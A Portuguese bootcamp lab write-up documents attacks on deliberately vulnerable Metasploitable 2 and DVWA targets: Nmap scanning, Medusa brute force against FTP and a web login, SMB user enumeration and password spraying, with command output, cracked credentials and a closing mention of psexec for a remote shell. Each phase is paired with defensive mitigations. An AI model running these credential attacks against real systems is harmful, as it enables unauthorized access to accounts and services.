# 🛡️ Documentação Educacional: Compreendendo e Mitigando Ataques FTP de Força Bruta

Esta documentação tem o objetivo de educar sobre as técnicas de varredura e força bruta usadas contra serviços FTP, utilizando **Kali Linux** como sistema operacional atacante e **Metasploitable 2** como máquina alvo vulnerável.

---

## 1. 🌐 Reconhecimento e Varredura (Nmap)

**Conceito:** O reconhecimento é o estágio inicial onde um testador de segurança identifica hosts ativos e os serviços rodando neles. O **Nmap** (Network Mapper) é a ferramenta padrão para este fim.

**Objetivo:** Identificar se a porta **21 (FTP)** está aberta e acessível.

**Comando utilizado:**

```bash
$ nmap -sV -p 21 192.168.56.101
````

**Saída do Terminal:**

```text
Starting Nmap 7.95 ( [https://nmap.org](https://nmap.org) ) at 2025-11-22 03:07 -03
Nmap scan report for 192.168.56.101
Host is up (0.00054s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
MAC Address: 08:00:27:3A:2B:96 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) .
Nmap done: 1 IP address (1 host up) scanned in 23.57 seconds
```

### 🛡️ Defesa (Mitigação)

  * **Firewall:** Bloquear o acesso à porta 21 de endereços IP externos não confiáveis. O acesso deve ser restrito a redes internas ou IPs específicos (princípio do **menor privilégio**).
  * **Monitoramento de Rede:** Utilizar um **IDS/IPS (Intrusion Detection/Prevention System)** para alertar sobre varreduras de porta excessivas.

-----

## 2\. 📝 Enumeração e Coleta de Informações

**Conceito:** Após a varredura, a enumeração foca em coletar informações detalhadas sobre o serviço. No caso do FTP, isso pode incluir a versão do software e se o **acesso anônimo** está permitido.

**Objetivo:** Obter a versão do servidor FTP para identificar possíveis vulnerabilidades conhecidas (CVEs).

**Resultado da Enumeração:**

```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
```

### 🛡️ Defesa (Mitigação)

  * **Desativar Acesso Anônimo:** Se não for estritamente necessário, configure o servidor FTP para **não permitir** logins anônimos.
  * **Ocultar/Alterar Banners:** Configurar o servidor para não divulgar a versão exata do software no *banner* (técnica de *security through obscurity*), dificultando o trabalho do atacante.
  * **Atualização de Software:** Manter o software FTP (como ProFTPD, vsftpd) **sempre atualizado** para corrigir vulnerabilidades conhecidas.

-----

## 3\. 💣 Quebra de Senha de Força Bruta (Medusa)

**Conceito:** A força bruta envolve tentar um grande número de combinações de nome de usuário e senha até encontrar uma válida. O **Medusa** é uma ferramenta popular para testes de força bruta em diversos protocolos.

**Wordlists:** Os atacantes criam ou usam listas pré-existentes (`wordlists`) que contêm senhas e nomes de usuário comuns.

**Passo 1: Criação das Wordlists**

```bash
$echo -e "user\nmsfadmin\nnadmin\nnroot" > users.txt$ echo -e "123456\nnpassword\nnqwerty\nmsfadmin" > pass.txt
```

**Passo 2: Execução do Ataque**

**Objetivo:** Encontrar credenciais válidas para obter acesso não autorizado ao sistema.

```bash
$ medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6
```

**Saída do Terminal (Sucesso):**

```text
2025-11-22 02:22:32 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 1 complete) Password: 123456 (1 of 4 complete)
...
2025-11-22 02:22:33 ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]
...
2025-11-22 02:22:38 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 4, 5 complete) Password: msfadmin (4 of 4 complete)
```

### 🛡️ Defesa (Mitigação Crucial)

  * **Políticas de Senha Fortes:** Impor senhas longas, complexas e que sejam trocadas regularmente.
  * **Bloqueio de Contas (Rate Limiting):** Configurar o servidor para **bloquear temporariamente** um IP ou usuário após um pequeno número de tentativas falhas (ex: 5 falhas em 5 minutos).
  * **Autenticação de Dois Fatores (2FA):** Implementar 2FA, tornando a quebra por força bruta inútil.
  * **Usar SFTP/FTPS:** Evitar o FTP simples (texto claro). Usar **SFTP** ou **FTPS** para criptografar a comunicação.

    

-----

### 🔌 Validação do Acesso

Confirmando a invasão conectando com as credenciais descobertas:

```bash
$ ftp 192.168.56.101
Connected to 192.168.56.101.
220 (vsFTPd 2.3.4)
Name (192.168.56.101:kaht): msfadmin
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

-----

## 4\. 🔗 Resumo das Defesas

| Risco de Segurança | Ferramentas Usadas | Estratégia de Defesa Recomendada |
| :--- | :--- | :--- |
| **Descoberta de Porta 21** | Nmap | Firewall com lista de acesso restrito (ACL). |
| **Enumeração de Versão** | Nmap | Desativar banners de versão e manter software atualizado. |
| **Força Bruta de Credenciais** | Medusa | Bloqueio de IP após falhas, senhas fortes, 2FA, e usar SFTP/FTPS. |

## 🌐 Laboratório: Ataque de Força Bruta em Aplicação Web (DVWA)

Este projeto documenta a execução prática de um ataque de força bruta contra o formulário de login da aplicação vulnerável DVWA (Damn Vulnerable Web App). O objetivo é demonstrar como configurações de segurança fracas em aplicações web podem ser exploradas por ferramentas automatizadas.

# 🎯 Cenário e Objetivo

Diferente de ataques a serviços de infraestrutura (como FTP ou SSH), ataques a aplicações Web exigem o entendimento da estrutura HTTP (GET/POST) e como a aplicação processa as credenciais.

Atacante: Kali Linux (Utilizando a ferramenta Medusa)

Alvo: Metasploitable 2 (Rodando DVWA)

Vulnerabilidade: Autenticação Fraca e ausência de proteção Anti-Automação (Rate Limiting/CSRF).

# 🛠️ Execução Passo a Passo

** 1. Preparação (Reconhecimento e Wordlists) **

Antes de iniciar o ataque, foram criadas listas de palavras (wordlists) personalizadas contendo credenciais padrão frequentemente encontradas em ambientes mal configurados.

Nota: Os comandos abaixo foram executados para gerar os arquivos user.txt e pass.txt utilizados no ataque.

# Criação da lista de usuários
```bash
echo -e "user\nmsfadmin\nadmin\nroot" > user.txt
```
# Criação da lista de senhas
```bash
echo -e "123456\nnpassword\nnqwerty\nmsfadmin" > pass.txt
``` 

# 2. Configuração do Ataque (Sintaxe do Medusa)

O ataque utilizou o módulo http do Medusa. A complexidade deste ataque reside na necessidade de mapear corretamente os campos do formulário HTML e a resposta de erro.

Comando Utilizado:
```bash
medusa -h 192.168.56.101 -U user.txt -P pass.txt -M http \
-m PAGE:'/dvwa/login.php' \
-m FORM:'username=^USER^&password=^PASS^&Login=Login' \
-m 'FAIL=Login failed' -t 6
```

Decomposição Técnica dos Parâmetros:

Parâmetro

Função

Descrição

-h

Host

O IP do servidor alvo (192.168.56.101).

-M http

Módulo

Seleciona o módulo específico para ataques Web.

-m PAGE

Endpoint

O caminho da página de login (/dvwa/login.php).

-m FORM

Payload

A estrutura POST. ^USER^ e ^PASS^ são variáveis onde o Medusa injeta os dados das wordlists.

-m FAIL

Condição

Define que a string "Login failed" na resposta indica fracasso.

# 📸 Evidência e Troubleshooting

Preparação: Criação bem-sucedida das wordlists com echo.

Troubleshooting: Na primeira tentativa de execução, ocorreu um erro: FATAL: Failed to open file users.txt. Isso aconteceu devido a um erro de digitação (o arquivo criado foi user.txt, no singular).

Correção e Sucesso: Após ajustar o comando para o nome correto do arquivo, a ferramenta executou perfeitamente.

# 📊 Resultados Obtidos

O ataque foi bem-sucedido, comprometendo múltiplas contas de alto privilégio na aplicação:

✅ admin / 123456

✅ msfadmin / msfadmin

✅ root / 123456

✅ user / qwerty

Isso demonstra que a aplicação utilizava senhas extremamente fracas e previsíveis.

# 🛡️ Mitigação e Defesa (Blue Team)

Para prevenir este tipo de ataque em um ambiente de produção, as seguintes camadas de defesa são recomendadas:

1. Implementação de Tokens Anti-CSRF

O ataque acima funciona porque o formulário aceita requisições diretas. Se o DVWA Security Level fosse alterado para "High", um Anti-CSRF Token seria exigido. Ferramentas simples como o Medusa falhariam, pois não conseguem ler o token antes de enviar a senha.

2. Account Lockout e Rate Limiting

Configurar o servidor para bloquear IPs ou contas após um número definido de falhas (ex: 5 tentativas em 5 minutos).

Ferramenta sugerida: Fail2Ban monitorando os logs do Apache/Nginx.

3. Monitoramento de Logs (SIEM)

Um ataque de força bruta gera um padrão de tráfego ruidoso.

Indicador de Comprometimento (IoC): Múltiplas requisições POST /dvwa/login.php originadas do mesmo IP em segundos, resultando em respostas de tamanho idêntico (indicando falha) ou código HTTP 200/302.

Laboratório desenvolvido durante o Bootcamp Santander Cibersegurança 2025.

## ⛓️ Ataque em Cadeia: SMB Enumeration & Password Spraying

Este laboratório documenta um "Kill Chain" simplificado, onde o resultado de uma fase (Enumeração) alimenta diretamente a próxima fase (Ataque de Senha). O objetivo é comprometer contas SMB evitando bloqueios de conta (Account Lockout).

# 🧠 Conceito: Password Spraying vs. Brute Force

Diferente da força bruta tradicional (tentar muitas senhas para um usuário), o Password Spraying inverte a lógica para evitar a detecção.

Força Bruta: 1 Usuário x 1000 Senhas (🚨 Gera bloqueio de conta).

Password Spraying: 100 Usuários x 1 Senha (✅ Stealthy / Silencioso).

# 🕵️ Fase 1: Enumeração SMB (Reconhecimento)

O primeiro passo é identificar usuários válidos no sistema alvo. O protocolo SMB (Server Message Block) mal configurado frequentemente permite listar usuários sem autenticação (Sessão Nula).

Alvo: Metasploitable 2 (192.168.56.101)

Ferramenta: Nmap (NSE Scripts)

Utilizamos o Nmap Scripting Engine (NSE) para interrogar o serviço SMB e listar os usuários.
```bash
nmap -p 445 --script smb-enum-users 192.168.56.101
```

Saída Relevante (Exemplo):
```bash
Starting Nmap 7.94 ( [https://nmap.org](https://nmap.org) )
Nmap scan report for 192.168.56.101
PORT    STATE SERVICE
445/tcp open  microsoft-ds
| smb-enum-users: 
|   MSFADMIN\msfadmin (RID: 1000)
|   MSFADMIN\user (RID: 1001)
|   MSFADMIN\service (RID: 1002)
|   MSFADMIN\postgres (RID: 1003)
|_  MSFADMIN\klog (RID: 1004)
```

# 📝 Preparando o Vetor de Ataque

Com base na saída do Nmap acima, criamos nossa lista de alvos (targets.txt):
```bash
echo -e "msfadmin\nuser\nservice\npostgres\nklog" > targets.txt
```

# ⚔️ Fase 2: Execução do Password Spraying (Medusa)

Agora, utilizamos o Medusa para testar uma única senha forte (ou padrão) contra todos os usuários da lista.

Cenário: Vamos testar se algum desses usuários utiliza a senha padrão msfadmin ou 123456.

Comando:
```bash
medusa -h 192.168.56.101 -U targets.txt -p "msfadmin" -M smbnt
```

Decomposição do Comando:

-U targets.txt: A lista de usuários válida que obtivemos na Fase 1.

-p "msfadmin": Uma única senha (letra minúscula) para testar em todos.

-M smbnt: Módulo do Medusa específico para autenticação Windows/Samba.

Resultado no Terminal:
```bash
Medusa v2.2 [[http://www.foofus.net](http://www.foofus.net)] starting at 2025-11-30
ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 User: user Password: msfadmin [FAILED]
ACCOUNT FOUND: [smbnt] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]
ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 User: service Password: msfadmin [FAILED]
ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 User: postgres Password: msfadmin [FAILED]
```

Sucesso: Identificamos que o usuário msfadmin reutiliza o nome de usuário como senha.

# 🛡️ Fase 3: Mitigação e Defesa

Como Blue Team, como impedimos essa cadeia de ataque?

Vulnerabilidade

Solução Técnica

Enumeração de Usuários

Configurar RestrictAnonymous = 2 no registro do Windows ou map to guest = Never no Samba para impedir listagem de usuários sem login.

Password Spraying

Monitorar logs de eventos (Windows Event ID 4625 - Falha de Login). Se múltiplos usuários falharem o login vindo do mesmo IP em segundos, bloquear o IP.

Senhas Fracas

Implementar políticas que impeçam o uso do nome de usuário como parte da senha.

# 🚀 Próximos Passos (Pós-Exploração)

Com a credencial msfadmin:msfadmin validada no SMB, um atacante poderia:

Listar compartilhamentos de arquivos: smbclient -L //192.168.56.101 -U msfadmin

Tentar logar via SSH (Reutilização de senha).

Executar o exploit Psexec para obter uma shell remota.

Laboratório desenvolvido para fins educacionais no Bootcamp Santander Cibersegurança.

```
```
